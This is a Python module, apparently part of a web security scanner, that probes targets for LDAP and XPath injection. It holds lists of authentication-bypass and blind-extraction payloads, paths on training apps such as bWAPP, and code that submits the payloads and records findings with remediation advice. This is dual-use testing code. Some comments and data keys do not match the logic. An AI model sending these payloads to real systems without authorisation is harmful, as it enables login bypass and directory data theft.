"""
LDAP and XPath Injection Scanner.
Tests for LDAP injection and XPath injection vulnerabilities.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin

import httpx

from scanning.findings import Finding, Severity
from scanning.vuln_scanner import ScanModule
from utils.scan_client import get_scan_client
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class LDAPXPathScanner(ScanModule):
    """
    LDAP and XPath Injection Scanner.
    
    Tests for:
    - LDAP injection in authentication
    - LDAP injection in search
    - Blind LDAP injection
    - XPath injection in XML queries
    - Blind XPath injection
    - Authentication bypass via LDAP/XPath
    """
    
    name = "ldap_xpath_scanner"
    
    # G-08 FIX: Priority payloads for fast initial detection (test these first)
    LDAP_PRIORITY_PAYLOADS = [
        "*",           # Wildcard - most universal
        "*)(&",        # Filter break
        "*()|&'",      # Special chars
        ")(cn=*",      # Filter manipulation
    ]

    # Full LDAP injection payloads (used only on promising endpoints)
    LDAP_PAYLOADS = [
        # Basic injection
        "*",
        "*)(&",
        "*)(|(&",
        "*()|&'",
        # Authentication bypass
        "admin)(&)",
        "admin)(|(password=*))",
        "*)(uid=*))(|(uid=*",
        # Blind LDAP
        "admin)(|(objectClass=*",
        "*)(objectClass=user",
        "*)(!(&(userPassword=*)",
        # Wildcard abuse
        "a*",
        "*a*",
        # Escape sequence
        "admin\\00",
        "admin%00",
        # Filter manipulation
        ")(cn=*",
        ")(|(cn=*)(sn=*",
        "*)(|(userPassword=a*)(",
        # DN injection
        "admin,dc=*",
        "admin)(objectClass=*",
    ]
    
    # G-08 FIX: Priority payloads for fast XPath detection
    XPATH_PRIORITY_PAYLOADS = [
        "' or '1'='1",     # Classic boolean
        "' or ''='",       # Empty string match
        "1 or 1=1",        # Numeric injection
        "']/*",            # Node traversal
    ]

    # Full XPath injection payloads (used only on promising endpoints)
    XPATH_PAYLOADS = [
        # Basic XPath injection
        "' or '1'='1",
        "' or ''='",
        "1' or '1'='1",
        "x' or name()='username' or 'x'='y",
        # Authentication bypass
        "admin' or '1'='1",
        "admin'--",
        "admin']/*[1]/password[.='",
        # Blind XPath
        "' or 1=1 or '",
        "' or count(//user)>0 or '",
        "' or string-length(name(/*[1]))>1 or '",
        # Boolean extraction
        "' or substring(//user[1]/username,1,1)='a",
        "' or starts-with(//user[1]/username,'a') or '",
        # Node extraction
        "' | //user/* | '",
        "' or //* or '",
        # Numeric extraction
        "1 or 1=1",
        "1 and 1=1",
        # Comment injection
        "admin'/*",
        "admin'//",
    ]
    
    # LDAP error patterns (G-08: Enhanced for modern LDAP servers)
    LDAP_ERRORS = [
        # PHP LDAP errors
        "ldap_search",
        "ldap_bind",
        "ldap_parse",
        "ldap_connect",
        "ldap_add",
        "ldap_modify",
        # Filter errors
        "invalid dn",
        "bad search filter",
        "invalid filter",
        "search filter is invalid",
        "filter error",
        "malformed filter",
        # General LDAP
        "ldap error",
        "ldaperror",
        "object class violation",
        "naming violation",
        "invalid syntax",
        "protocol error",
        # Java LDAP
        "javax.naming.directory",
        "com.sun.jndi.ldap",
        "javax.naming.NamingException",
        "InvalidSearchFilterException",
        # Python LDAP
        "ldap.FILTER_ERROR",
        "ldap.INVALID_DN_SYNTAX",
        "python-ldap",
        # .NET/C# LDAP
        "System.DirectoryServices",
        "DirectorySearcher",
        "SearchResultCollection",
        # Ruby LDAP
        "Net::LDAP",
        "LDAP::ResultError",
        # Modern frameworks
        "spring-ldap",
        "unboundid",
        "apache directory",
    ]
    
    # XPath error patterns (G-08: Enhanced for modern frameworks)
    XPATH_ERRORS = [
        # Generic XPath
        "xpath",
        "xpatherror",
        "xpathexception",
        "invalid expression",
        "expression error",
        "expression expected",
        "invalid predicate",
        "missing closing quote",
        "unbalanced predicate",
        # PHP XML/XPath
        "xmlxpathcomp",
        "xmlxpatheval",
        "SimpleXMLElement",
        "DOMXPath",
        "DOMDocument",
        "libxml error",
        # Java XPath
        "javax.xml.xpath",
        "XPathExpressionException",
        "saxparseexception",
        "TransformerException",
        # Python XPath
        "lxml.etree",
        "XPathEvalError",
        "XPathSyntaxError",
        # .NET XPath
        "System.Xml.XPath",
        "XPathNavigator",
        "XPathException",
        # Ruby XPath
        "Nokogiri::XML",
        "REXML::XPath",
        # Node.js XPath
        "xpath-evaluator",
        "xmldom",
        # Modern errors
        "syntax error in xpath",
        "xpath query failed",
        "invalid xpath expression",
    ]
    
    # G-08 FIX: Known LDAP/XPath vulnerable paths for proactive discovery
    KNOWN_LDAP_PATHS = [
        # bWAPP LDAP
        "/bWAPP/ldapi.php",
        "/ldapi.php",
        # DVWA - no LDAP but has login
        "/vulnerabilities/brute/",
        "/login.php",
        # Generic LDAP endpoints
        "/ldap/search",
        "/ldap/auth",
        "/ldap/login",
        "/api/ldap/search",
        "/api/ldap/auth",
        "/directory/search",
        "/directory/lookup",
        "/ad/search",
        "/activedirectory/",
        # Corporate apps
        "/corporate/login",
        "/intranet/login",
        "/portal/login",
    ]

    KNOWN_XPATH_PATHS = [
        # bWAPP XPath
        "/bWAPP/xmli_1.php",
        "/bWAPP/xmli_2.php",
        "/xmli_1.php",
        "/xmli_2.php",
        # Generic XML endpoints
        "/xml/search",
        "/xml/query",
        "/api/xml/search",
        "/search.xml",
        "/query.xml",
        "/data.xml",
        # SOAP endpoints (often use XPath)
        "/soap/",
        "/ws/",
        "/webservice/",
    ]

    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0

    # G-08 FIX: Reduced from 60s to 120s (still allows thorough but prevents 480s hangs)
    MAX_SCAN_DURATION = 120.0  # 2 minutes max for entire module

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Scan for LDAP and XPath injection vulnerabilities."""
        import time
        scan_start = time.time()

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[Finding] = []

        if not host.startswith("http"):
            # Use http:// for localhost/local IPs, https:// for external
            is_local = any(host.startswith(p) for p in ("localhost", "127.", "192.168.", "10.", "172."))
            base_url = f"http://{host}" if is_local else f"https://{host}"
        else:
            base_url = host

        # FIX: Pass auth headers for authenticated endpoint testing
        async with get_scan_client(
            verify_ssl=False,
            timeout=min(self.timeout, 10.0),  # Cap per-request timeout to 10s
            custom_headers=self._auth_headers,
        ) as client:
            # Get baseline response
            baseline = await self._get_baseline(client, base_url, rate_limiter)

            # FIX 2026-02-13: Quick applicability check - skip if target unlikely to use LDAP/XPath
            if not self._is_target_applicable(baseline):
                logger.debug(f"[LDAP/XPath] Target {host} unlikely to use LDAP/XPath - skipping detailed tests")
                return []

            # G-08 FIX: Phase 1 - Discover existing endpoints FIRST (fast)
            discovered_ldap = await self._discover_ldap_endpoints(client, base_url, rate_limiter)
            discovered_xpath = await self._discover_xpath_endpoints(client, base_url, rate_limiter)

            logger.debug(f"[LDAP/XPath] Discovered {len(discovered_ldap)} LDAP, {len(discovered_xpath)} XPath endpoints")

            # G-08 FIX: Phase 2 - Test discovered endpoints with PRIORITY payloads first
            if discovered_ldap and time.time() - scan_start < self.MAX_SCAN_DURATION:
                ldap_findings = await self._test_ldap_injection_smart(
                    client, discovered_ldap, baseline, rate_limiter
                )
                findings.extend(ldap_findings)

            if discovered_xpath and time.time() - scan_start < self.MAX_SCAN_DURATION:
                xpath_findings = await self._test_xpath_injection_smart(
                    client, discovered_xpath, baseline, rate_limiter
                )
                findings.extend(xpath_findings)

            # G-08 FIX: Phase 3 - Test auth endpoints (most likely to have LDAP)
            if time.time() - scan_start < self.MAX_SCAN_DURATION:
                auth_findings = await self._test_auth_injection(
                    client, base_url, rate_limiter
                )
                findings.extend(auth_findings)

            # G-08 FIX: Phase 4 - Search endpoints (if time permits)
            if time.time() - scan_start < self.MAX_SCAN_DURATION * 0.7:  # Only if < 70% time used
                search_findings = await self._test_search_injection(
                    client, base_url, baseline, rate_limiter
                )
                findings.extend(search_findings)

            # G-08 FIX: Phase 5 - Blind injection ONLY if promising findings exist
            if findings and time.time() - scan_start < self.MAX_SCAN_DURATION * 0.8:
                blind_findings = await self._test_blind_injection(
                    client, base_url, rate_limiter
                )
                findings.extend(blind_findings)

            if time.time() - scan_start >= self.MAX_SCAN_DURATION:
                logger.info(f"[LDAP/XPath] Scan timeout reached ({self.MAX_SCAN_DURATION}s) - partial results")

        return findings

    async def _discover_ldap_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """G-08 FIX: Discover which LDAP endpoints actually exist before testing."""
        discovered = []

        for path in self.KNOWN_LDAP_PATHS:
            await rate_limiter.acquire()
            url = urljoin(base_url, path)

            try:
                response = await client.get(url, follow_redirects=True)
                # Consider it exists if not 404 and has content
                if response.status_code != 404 and len(response.text) > 100:
                    # Check for LDAP indicators
                    text_lower = response.text.lower()
                    ldap_indicators = ["username", "login", "search", "directory", "ldap", "filter", "uid", "cn="]
                    if any(ind in text_lower for ind in ldap_indicators):
                        discovered.append(url)
                        logger.debug(f"[LDAP] Discovered endpoint: {url}")
            except Exception:
                pass

        return discovered

    async def _discover_xpath_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """G-08 FIX: Discover which XPath endpoints actually exist before testing."""
        discovered = []

        for path in self.KNOWN_XPATH_PATHS:
            await rate_limiter.acquire()
            url = urljoin(base_url, path)

            try:
                response = await client.get(url, follow_redirects=True)
                if response.status_code != 404 and len(response.text) > 100:
                    # Check for XML/XPath indicators
                    text_lower = response.text.lower()
                    content_type = response.headers.get("content-type", "").lower()

                    xpath_indicators = ["xml", "xpath", "query", "search", "<?xml", "<root>", "soap"]
                    if "xml" in content_type or any(ind in text_lower for ind in xpath_indicators):
                        discovered.append(url)
                        logger.debug(f"[XPath] Discovered endpoint: {url}")
            except Exception:
                pass

        return discovered

    async def _test_ldap_injection_smart(
        self,
        client: httpx.AsyncClient,
        endpoints: list[str],
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """G-08 FIX: Smart LDAP injection testing - priority payloads first."""
        findings = []
        test_params = ["username", "user", "uid", "cn", "dn", "filter", "search", "query"]

        for url in endpoints:
            found_vuln = False

            for param in test_params[:4]:  # Test top 4 params first
                # Phase 1: Priority payloads (fast detection)
                for payload in self.LDAP_PRIORITY_PAYLOADS:
                    if found_vuln:
                        break

                    await rate_limiter.acquire()

                    try:
                        params = {param: payload, "password": "test"}
                        response = await client.get(url, params=params)

                        if self._check_ldap_error(response.text):
                            findings.append(Finding(
                                name="LDAP Injection",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"LDAP injection in parameter '{param}'",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "LDAP error in response",
                                    f"Detected via priority payload"
                                ],
                                cwe_id="CWE-90",
                                cvss_score=8.1,
                                remediation="Use LDAP parameter binding. Sanitize special characters (*)(|\\).",
                            ))
                            found_vuln = True
                            break

                        # Check auth bypass
                        if response.status_code == 200 and self._check_auth_bypass(response.text, baseline["text"]):
                            findings.append(Finding(
                                name="LDAP Authentication Bypass",
                                severity=Severity.CRITICAL,
                                confidence_score=75.0,
                                description="Authentication bypass via LDAP injection",
                                endpoint=url,
                                evidence=[f"Payload: {payload}", "Auth success indicators"],
                                cwe_id="CWE-90",
                                cvss_score=9.8,
                                remediation="Implement proper LDAP query parameterization.",
                            ))
                            found_vuln = True
                            break

                    except Exception as e:
                        logger.debug(f"Error testing LDAP: {e}")

                if found_vuln:
                    break

        return findings

    async def _test_xpath_injection_smart(
        self,
        client: httpx.AsyncClient,
        endpoints: list[str],
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """G-08 FIX: Smart XPath injection testing - priority payloads first."""
        findings = []
        test_params = ["username", "user", "query", "search", "filter", "xpath", "id", "name"]

        for url in endpoints:
            found_vuln = False

            for param in test_params[:4]:  # Test top 4 params first
                # Phase 1: Priority payloads (fast detection)
                for payload in self.XPATH_PRIORITY_PAYLOADS:
                    if found_vuln:
                        break

                    await rate_limiter.acquire()

                    try:
                        params = {param: payload}
                        response = await client.get(url, params=params)

                        if self._check_xpath_error(response.text):
                            findings.append(Finding(
                                name="XPath Injection",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"XPath injection in parameter '{param}'",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "XPath error in response",
                                    f"Detected via priority payload"
                                ],
                                cwe_id="CWE-643",
                                cvss_score=7.5,
                                remediation="Use parameterized XPath queries. Sanitize single quotes.",
                            ))
                            found_vuln = True
                            break

                        # Check data extraction
                        if response.status_code == 200 and len(response.text) > baseline["length"] * 1.5:
                            findings.append(Finding(
                                name="XPath Injection - Data Extraction",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description="XPath injection may allow data extraction",
                                endpoint=url,
                                evidence=[f"Payload: {payload}", "Larger response than baseline"],
                                cwe_id="CWE-643",
                                cvss_score=7.5,
                                remediation="Implement XPath query parameterization.",
                            ))
                            found_vuln = True
                            break

                    except Exception as e:
                        logger.debug(f"Error testing XPath: {e}")

                if found_vuln:
                    break

        return findings

    def _is_target_applicable(self, baseline: dict[str, Any]) -> bool:
        """
        Quick check if target is likely to use LDAP or XPath.

        Returns False for targets that are clearly not applicable:
        - Pure REST APIs returning JSON (no XML, no login forms)
        - SPAs without server-side auth
        - Static sites
        """
        content = baseline.get("content", "").lower()
        content_type = baseline.get("content_type", "").lower()

        # Indicators that LDAP/XPath might be relevant
        ldap_indicators = [
            "ldap", "directory", "active directory", "openldap",
            "login", "signin", "sign-in", "authenticate",
            "username", "password", "credentials",
            "uid=", "cn=", "dc=", "ou=",
        ]

        xpath_indicators = [
            "xml", "xpath", "xquery", "xslt",
            "<?xml", "<root>", "<data>", "<item>",
            "application/xml", "text/xml",
        ]

        # Check content type for XML
        if "xml" in content_type:
            return True

        # Check for LDAP/XPath indicators in content
        for indicator in ldap_indicators + xpath_indicators:
            if indicator in content:
                return True

        # If it's a pure JSON API, probably not LDAP/XPath
        if "application/json" in content_type and "login" not in content and "auth" not in content:
            logger.debug("[LDAP/XPath] Pure JSON API without auth indicators - skipping")
            return False

        # Default: test it (conservative)
        return True
    
    async def _get_baseline(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Get baseline response characteristics."""
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            return {
                "status": response.status_code,
                "length": len(response.text),
                "text": response.text[:1000],
            }
        except Exception:
            return {"status": 0, "length": 0, "text": ""}
    
    async def _test_ldap_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for LDAP injection vulnerabilities."""
        findings = []
        
        # Common LDAP endpoints
        ldap_endpoints = [
            "/login",
            "/auth",
            "/ldap",
            "/search",
            "/directory",
            "/users/search",
            "/api/users",
            "/api/ldap",
            "/api/auth",
        ]
        
        test_params = ["username", "user", "uid", "cn", "dn", "filter", "search", "query"]
        
        for endpoint in ldap_endpoints:
            url = urljoin(base_url, endpoint)
            
            for param in test_params:
                for payload in self.LDAP_PAYLOADS[:10]:  # Test first 10
                    await rate_limiter.acquire()
                    
                    try:
                        # Test GET
                        params = {param: payload, "password": "test"}
                        response = await client.get(url, params=params)
                        
                        if self._check_ldap_error(response.text):
                            findings.append(Finding(
                                name="LDAP Injection",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"LDAP injection in parameter '{param}'",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "LDAP error in response",
                                ],
                                cwe_id="CWE-90",
                                cvss_score=8.1,
                                remediation="Use LDAP parameter binding. "
                                           "Sanitize special characters (*)(|\\).",
                            ))
                            break
                        
                        # Check for authentication bypass
                        if response.status_code == 200:
                            if self._check_auth_bypass(response.text, baseline["text"]):
                                findings.append(Finding(
                                    name="LDAP Authentication Bypass",
                                    severity=Severity.CRITICAL,
                                    confidence_score=65.0,
                                    description="Authentication bypass via LDAP injection",
                                    endpoint=url,
                                    evidence=[
                                        f"Payload: {payload}",
                                        "Authentication success indicators",
                                    ],
                                    cwe_id="CWE-90",
                                    cvss_score=9.8,
                                    remediation="Implement proper LDAP query parameterization.",
                                ))
                                break
                        
                        # Test POST
                        await rate_limiter.acquire()
                        response = await client.post(url, data=params)
                        
                        if self._check_ldap_error(response.text):
                            findings.append(Finding(
                                name="LDAP Injection (POST)",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"LDAP injection via POST parameter '{param}'",
                                endpoint=url,
                                evidence=[f"Payload: {payload}"],
                                cwe_id="CWE-90",
                                cvss_score=8.1,
                                remediation="Sanitize LDAP special characters.",
                            ))
                            break
                            
                    except Exception as e:
                        logger.debug(f"Error testing LDAP: {e}")
        
        return findings
    
    async def _test_xpath_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XPath injection vulnerabilities."""
        findings = []
        
        # Common XPath endpoints
        xpath_endpoints = [
            "/login",
            "/search",
            "/api/search",
            "/xml",
            "/api/xml",
            "/query",
            "/filter",
            "/data",
            "/api/data",
        ]
        
        test_params = ["username", "user", "query", "search", "filter", "xpath", "id", "name"]
        
        for endpoint in xpath_endpoints:
            url = urljoin(base_url, endpoint)
            
            for param in test_params:
                for payload in self.XPATH_PAYLOADS[:10]:
                    await rate_limiter.acquire()
                    
                    try:
                        # Test GET
                        params = {param: payload}
                        response = await client.get(url, params=params)
                        
                        if self._check_xpath_error(response.text):
                            findings.append(Finding(
                                name="XPath Injection",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"XPath injection in parameter '{param}'",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "XPath error in response",
                                ],
                                cwe_id="CWE-643",
                                cvss_score=7.5,
                                remediation="Use parameterized XPath queries. "
                                           "Sanitize single quotes and special characters.",
                            ))
                            break
                        
                        # Check for data extraction
                        if response.status_code == 200 and len(response.text) > baseline["length"] * 1.5:
                            findings.append(Finding(
                                name="XPath Injection - Data Extraction",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description="XPath injection may allow data extraction",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Significantly larger response",
                                ],
                                cwe_id="CWE-643",
                                cvss_score=7.5,
                                remediation="Implement XPath query parameterization.",
                            ))
                            break
                        
                        # Test POST
                        await rate_limiter.acquire()
                        response = await client.post(url, data=params)
                        
                        if self._check_xpath_error(response.text):
                            findings.append(Finding(
                                name="XPath Injection (POST)",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"XPath injection via POST parameter '{param}'",
                                endpoint=url,
                                evidence=[f"Payload: {payload}"],
                                cwe_id="CWE-643",
                                cvss_score=7.5,
                                remediation="Use parameterized XPath queries.",
                            ))
                            break
                            
                    except Exception as e:
                        logger.debug(f"Error testing XPath: {e}")
        
        return findings
    
    async def _test_auth_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test authentication endpoints for LDAP/XPath injection."""
        findings = []
        
        auth_endpoints = [
            "/login",
            "/authenticate",
            "/auth/login",
            "/api/login",
            "/api/auth",
        ]
        
        # LDAP auth bypass payloads
        ldap_auth_bypass = [
            {"username": "*", "password": "*"},
            {"username": "admin)(|(password=*", "password": "x"},
            {"username": "*)(&", "password": "x"},
            {"username": "*)(uid=*))(|(uid=*", "password": "x"},
            {"username": "admin)(!(&(userPassword=*", "password": "x"},
        ]
        
        # XPath auth bypass payloads
        xpath_auth_bypass = [
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin' or '1'='1", "password": "x"},
            {"username": "admin'--", "password": "x"},
            {"username": "' or ''='", "password": "' or ''='"},
        ]
        
        for endpoint in auth_endpoints:
            url = urljoin(base_url, endpoint)
            
            # Check if endpoint exists
            await rate_limiter.acquire()
            try:
                check = await client.get(url)
                if check.status_code == 404:
                    continue
            except Exception:
                continue
            
            # Test LDAP bypass
            for payload in ldap_auth_bypass:
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(url, data=payload)
                    
                    if response.status_code in [200, 302]:
                        # Check for success indicators
                        success_indicators = ["dashboard", "welcome", "logout", "session", "token", "authenticated"]
                        
                        if any(ind in response.text.lower() for ind in success_indicators):
                            findings.append(Finding(
                                name="LDAP Authentication Bypass",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description="Authentication bypass via LDAP injection",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Authentication success",
                                ],
                                cwe_id="CWE-90",
                                cvss_score=9.8,
                                remediation="Never construct LDAP filters from user input. "
                                           "Use prepared statements.",
                            ))
                            break
                        
                except Exception as e:
                    logger.debug(f"Error testing LDAP auth: {e}")
            
            # Test XPath bypass
            for payload in xpath_auth_bypass:
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(url, data=payload)
                    
                    if response.status_code in [200, 302]:
                        success_indicators = ["dashboard", "welcome", "logout", "session", "token", "authenticated"]
                        
                        if any(ind in response.text.lower() for ind in success_indicators):
                            findings.append(Finding(
                                name="XPath Authentication Bypass",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description="Authentication bypass via XPath injection",
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    "Authentication success",
                                ],
                                cwe_id="CWE-643",
                                cvss_score=9.8,
                                remediation="Use parameterized XPath queries.",
                            ))
                            break
                        
                except Exception as e:
                    logger.debug(f"Error testing XPath auth: {e}")
        
        return findings
    
    async def _test_search_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        baseline: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test search endpoints for injection."""
        findings = []
        
        search_endpoints = [
            "/search",
            "/api/search",
            "/users/search",
            "/directory/search",
            "/find",
            "/lookup",
        ]
        
        for endpoint in search_endpoints:
            url = urljoin(base_url, endpoint)
            
            # Test LDAP wildcard
            await rate_limiter.acquire()
            
            try:
                response = await client.get(url, params={"q": "*"})
                
                if response.status_code == 200 and len(response.text) > baseline["length"] * 2:
                    findings.append(Finding(
                        name="LDAP Wildcard Search",
                        severity=Severity.MEDIUM,
                        confidence_score=65.0,
                        description="Search endpoint accepts LDAP wildcard, may enumerate data",
                        endpoint=url,
                        evidence=[
                            "Wildcard '*' returned large response",
                        ],
                        cwe_id="CWE-90",
                        cvss_score=5.3,
                        remediation="Sanitize wildcard characters. Implement result limits.",
                    ))
                    
            except Exception as e:
                logger.debug(f"Error testing search: {e}")
        
        return findings
    
    async def _test_blind_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for blind LDAP/XPath injection."""
        findings = []
        
        endpoints = ["/login", "/search", "/api/users"]
        
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            
            # Boolean-based blind LDAP
            await rate_limiter.acquire()
            
            try:
                # True condition
                true_response = await client.post(
                    url,
                    data={"username": "admin)(|(objectClass=*", "password": "test"}
                )
                
                await rate_limiter.acquire()
                
                # False condition
                false_response = await client.post(
                    url,
                    data={"username": "admin)(|(objectClass=nonexistent", "password": "test"}
                )
                
                # Compare responses
                if true_response.status_code == false_response.status_code == 200:
                    if len(true_response.text) != len(false_response.text):
                        findings.append(Finding(
                            name="Blind LDAP Injection",
                            severity=Severity.HIGH,
                            confidence_score=65.0,
                            description="Boolean-based blind LDAP injection detected",
                            endpoint=url,
                            evidence=[
                                f"True response: {len(true_response.text)} bytes",
                                f"False response: {len(false_response.text)} bytes",
                            ],
                            cwe_id="CWE-90",
                            cvss_score=7.5,
                            remediation="Sanitize LDAP filter input.",
                        ))
                        
            except Exception as e:
                logger.debug(f"Error testing blind injection: {e}")
        
        return findings
    
    def _check_ldap_error(self, text: str) -> bool:
        """Check if response contains LDAP errors."""
        text_lower = text.lower()
        return any(error in text_lower for error in self.LDAP_ERRORS)
    
    def _check_xpath_error(self, text: str) -> bool:
        """Check if response contains XPath errors."""
        text_lower = text.lower()
        return any(error in text_lower for error in self.XPATH_ERRORS)
    
    def _check_auth_bypass(self, response_text: str, baseline_text: str) -> bool:
        """Check for authentication bypass indicators."""
        success_indicators = ["dashboard", "welcome", "logout", "profile", "session", "authenticated"]
        return any(ind in response_text.lower() and ind not in baseline_text.lower() for ind in success_indicators)
